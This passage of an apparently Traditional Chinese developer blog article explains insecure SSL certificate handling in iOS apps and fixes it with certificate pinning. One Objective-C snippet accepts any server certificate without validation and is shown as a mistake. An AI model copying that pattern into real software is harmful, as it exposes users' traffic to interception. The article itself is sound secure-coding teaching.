&lt;span class=&quot;lineno&quot;&gt;35&lt;/span&gt;             &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;BOOL&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;equal&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cert1&lt;/span&gt; &lt;span class=&quot;nl&quot;&gt;isEqualToData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cert2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;36&lt;/span&gt;             &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;equal&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;37&lt;/span&gt;                 &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/* failed */&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;38&lt;/span&gt; 
&lt;span class=&quot;lineno&quot;&gt;39&lt;/span&gt;             &lt;span class=&quot;c1&quot;&gt;// The only good exit point&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;40&lt;/span&gt;             &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;challenge&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sender&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;nl&quot;&gt;useCredential&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;NSURLCredential&lt;/span&gt; &lt;span class=&quot;nl&quot;&gt;credentialForTrust&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;serverTrust&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;41&lt;/span&gt;                         &lt;span class=&quot;nl&quot;&gt;forAuthenticationChallenge&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;challenge&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;42&lt;/span&gt;         &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;43&lt;/span&gt;     &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;44&lt;/span&gt;     
&lt;span class=&quot;lineno&quot;&gt;45&lt;/span&gt;     &lt;span class=&quot;c1&quot;&gt;// Bad dog&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;46&lt;/span&gt;     &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;challenge&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sender&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;nl&quot;&gt;cancelAuthenticationChallenge&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;challenge&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;47&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;處理方式與前面的 Android 情況2類同，做了 certificate pinning。&lt;/p&gt;

&lt;h4 id=&quot;ios-3&quot;&gt;iOS 錯誤處理情況3&lt;/h4&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-objc&quot; data-lang=&quot;objc&quot;&gt;&lt;span class=&quot;lineno&quot;&gt; 1&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;URLSession:&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;NSURLSession&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;session&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 2&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;didReceiveChallenge:&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;NSURLAuthenticationChallenge&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;challenge&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 3&lt;/span&gt;   &lt;span class=&quot;nf&quot;&gt;completionHandler:&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;^&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NSURLSessionAuthChallengeDisposition&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;disposition&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 4&lt;/span&gt;                               &lt;span class=&quot;bp&quot;&gt;NSURLCredential&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;credential&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;completionHandler&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 5&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 6&lt;/span&gt;     &lt;span class=&quot;bp&quot;&gt;NSURLProtectionSpace&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;protectionSpace&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;challenge&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;protectionSpace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 7&lt;/span&gt;     &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;protectionSpace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;authenticationMethod&lt;/span&gt; &lt;span class=&quot;nl&quot;&gt;isEqualToString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NSURLAuthenticationMethodServerTrust&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 8&lt;/span&gt;         &lt;span class=&quot;n&quot;&gt;SecTrustRef&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;serverTrust&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;protectionSpace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;serverTrust&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 9&lt;/span&gt;         &lt;span class=&quot;n&quot;&gt;completionHandler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NSURLSessionAuthChallengeUseCredential&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;NSURLCredential&lt;/span&gt; &lt;span class=&quot;nl&quot;&gt;credentialForTrust&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;serverTrust&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;10&lt;/span&gt;     &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;11&lt;/span&gt;         &lt;span class=&quot;n&quot;&gt;completionHandler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NSURLSessionAuthChallengePerformDefaultHandling&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;nil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;12&lt;/span&gt;     &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;13&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;與前面 NSURLConnection 的情況類同，只是這裡使用到的是 iOS7  新增的 NSURLSession 元件。對應的處理方式如下：&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-objc&quot; data-lang=&quot;objc&quot;&gt;&lt;span class=&quot;lineno&quot;&gt; 1&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;URLSession:&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;NSURLSession&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;session&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 2&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;didReceiveChallenge:&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;NSURLAuthenticationChallenge&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;challenge&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 3&lt;/span&gt;   &lt;span class=&quot;nf&quot;&gt;completionHandler:&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;^&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NSURLSessionAuthChallengeDisposition&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;disposition&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 4&lt;/span&gt;                               &lt;span class=&quot;bp&quot;&gt;NSURLCredential&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;credential&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;completionHandler&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 5&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 6&lt;/span&gt;     &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;([[[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;challenge&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;protectionSpace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;authenticationMethod&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;nl&quot;&gt;isEqualToString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NSURLAuthenticationMethodServerTrust&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 7&lt;/span&gt;         &lt;span class=&quot;n&quot;&gt;SecTrustRef&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;serverTrust&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;challenge&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;protectionSpace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;serverTrust&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 8&lt;/span&gt;         &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;serverTrust&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt; 9&lt;/span&gt;             &lt;span class=&quot;n&quot;&gt;OSStatus&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;status&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SecTrustEvaluate&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;serverTrust&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;10&lt;/span&gt;             &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;errSecSuccess&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;status&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;11&lt;/span&gt;                 &lt;span class=&quot;n&quot;&gt;completionHandler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NSURLSessionAuthChallengeCancelAuthenticationChallenge&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;nil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;12&lt;/span&gt;                 &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;13&lt;/span&gt;             &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;14&lt;/span&gt;             
&lt;span class=&quot;lineno&quot;&gt;15&lt;/span&gt;             &lt;span class=&quot;bp&quot;&gt;NSData&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;localCertData&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;NSData&lt;/span&gt; &lt;span class=&quot;nl&quot;&gt;dataWithContentsOfFile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:[[&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;NSBundle&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mainBundle&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;16&lt;/span&gt;                                                    &lt;span class=&quot;nl&quot;&gt;pathForResource&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;@&amp;quot;random-org&amp;quot;&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;17&lt;/span&gt;                                                             &lt;span class=&quot;nl&quot;&gt;ofType&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;@&amp;quot;der&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]];&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;18&lt;/span&gt;             
&lt;span class=&quot;lineno&quot;&gt;19&lt;/span&gt;             &lt;span class=&quot;n&quot;&gt;SecCertificateRef&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;remoteServerCert&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SecTrustGetCertificateAtIndex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;serverTrust&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;20&lt;/span&gt;             &lt;span class=&quot;n&quot;&gt;CFDataRef&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;remoteCertData&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SecCertificateCopyData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;remoteServerCert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;21&lt;/span&gt;             &lt;span class=&quot;kt&quot;&gt;BOOL&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;isMatch&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;localCertData&lt;/span&gt; &lt;span class=&quot;nl&quot;&gt;isEqualToData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;__bridge&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;NSData&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;remoteCertData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;22&lt;/span&gt;             &lt;span class=&quot;n&quot;&gt;CFRelease&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;remoteCertData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;23&lt;/span&gt;             
&lt;span class=&quot;lineno&quot;&gt;24&lt;/span&gt;             &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;isMatch&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;25&lt;/span&gt;                 &lt;span class=&quot;n&quot;&gt;completionHandler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NSURLSessionAuthChallengeUseCredential&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;NSURLCredential&lt;/span&gt; &lt;span class=&quot;nl&quot;&gt;credentialForTrust&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;serverTrust&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;26&lt;/span&gt;             &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;27&lt;/span&gt;                 &lt;span class=&quot;n&quot;&gt;completionHandler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NSURLSessionAuthChallengeCancelAuthenticationChallenge&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;nil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;28&lt;/span&gt;             &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;29&lt;/span&gt;         &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;30&lt;/span&gt;     &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;31&lt;/span&gt;         &lt;span class=&quot;n&quot;&gt;completionHandler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NSURLSessionAuthChallengePerformDefaultHandling&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;nil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;32&lt;/span&gt;     &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;lineno&quot;&gt;33&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h4 id=&quot;webview-&quot;&gt;對 WebView 的一些補充&lt;/h4&gt;
&lt;p&gt;在對 WebView 做處理上，除了對 SSL 錯誤直接略過外，目前無論是在 Android 還是 iOS 上，SDK API 都尚未直接提供方法讓開發者能在 SSL Handshake 的途中作 Server Certificate Pinning。其中一個替代方法是，利用其他能夠作 Pinning 的元件將資料下載回來，接著把資料傳到 WebView 進行讀取，避開原本用 WebView 直接設定連線網址。蘋果公司有提供這種處理的&lt;a href=&quot;https://developer.apple.com/library/ios/samplecode/CustomHTTPProtocol/Introduction/Intro.html&quot;&gt;範例&lt;/a&gt;。&lt;/p&gt;

&lt;h3 id=&quot;section-4&quot;&gt;結語&lt;/h3&gt;
&lt;p&gt;本來為了提高安全性而使用的 SSL 加密連線，卻由於程式處理不當讓原來的保護形同虛設。觀念不足與為節省時間而沒做好處理相信是主要原因。網路上大量的文章在引指開發者略過錯誤警告的時候，卻沒有提醒他們這樣做帶來的影響，也助長了不當處理的發生。&lt;/p&gt;

&lt;p&gt;除了 SSL 處理問題外，手機應用程式開發還有許多要注意的安全問題，像是 OWASP 列出的 &lt;a href=&quot;https://www.owasp.org/index.php/Projects/OWASP_Mobile_Security_Project_-_Top_Ten_Mobile_Risks&quot;&gt;Top 10 Mobile Risks&lt;/a&gt;、由日本智慧型手機安全協會發佈 &lt;a href=&quot;http://www.jssec.org/report/android_securecoding_en_20140801.html&quot;&gt;Android Application Secure Design/Secure Coding Guidebook&lt;/a&gt; 裡面所建議的。開發商有責任做好安全把關以保障雙方權益。&lt;/p&gt;

&lt;h3 id=&quot;section-5&quot;&gt;參考&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;http://android-ssl.org&quot;&gt;Rethinking SSL Development in an Appified World&lt;/a&gt; &lt;br /&gt;&lt;/li&gt;
  &lt;li&gt;
    &lt;table&gt;
      &lt;tbody&gt;
        &lt;tr&gt;
          &lt;td&gt;[Unifying Key Store Access in ICS&lt;/td&gt;
          &lt;td&gt;Android Developers Blog](http://android-developers.blogspot.com/2012/03/unifying-key-store-access-in-ics.html)&lt;br /&gt;&lt;/td&gt;
        &lt;/tr&gt;
      &lt;/tbody&gt;
    &lt;/table&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://commonsware.com/blog/2013/03/04/ssl-android-basics.html&quot;&gt;The CommonsBlog — SSL on Android: The Basics&lt;/a&gt;&lt;br /&gt;&lt;/li&gt;
  &lt;li&gt;
    &lt;table&gt;
      &lt;tbody&gt;
        &lt;tr&gt;
          &lt;td&gt;[Security with HTTPS and SSL&lt;/td&gt;
          &lt;td&gt;Android Developers](https://developer.android.com/training/articles/security-ssl.html)&lt;br /&gt;&lt;/td&gt;
        &lt;/tr&gt;
      &lt;/tbody&gt;
    &lt;/table&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://developer.apple.com/librarY/mac/documentation/NetworkingInternet/Conceptual/NetworkingTopics/Articles/OverridingSSLChainValidationCorrectly.html&quot;&gt;Networking Programming Topics: Overriding TLS Chain Validation Correctly&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://developer.apple.com/library/ios/technotes/tn2232/_index.html&quot;&gt;Technical Note TN2232: HTTPS Server Trust Evaluation&lt;/a&gt;&lt;br /&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.owasp.org/index.php/Certificate_and_Public_Key_Pinning&quot;&gt;Certificate and Public Key Pinning - OWASP&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;footnotes&quot;&gt;
  &lt;ol&gt;
    &lt;li id=&quot;fn:note1&quot;&gt;
      &lt;p&gt;Google 基於效能及有效性的考量，在 Android 系統上預設停用&lt;a href=&quot;https://code.google.com/p/android/issues/detail?id=68643&quot;&gt;憑證撤銷檢查&lt;/a&gt;&lt;br /&gt; &lt;a href=&quot;#fnref:note1&quot; class=&quot;reversefootnote&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
    &lt;/li&gt;
    &lt;li id=&quot;fn:note2&quot;&gt;
      &lt;p&gt;OWASP 的 Android 範例中，內含的 PUB_KEY 是錯誤的 (最後更改日期 2014/08/14) &lt;a href=&quot;#fnref:note2&quot; class=&quot;reversefootnote&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
    &lt;/li&gt;
  &lt;/ol&gt;
&lt;/div&gt;
</content>
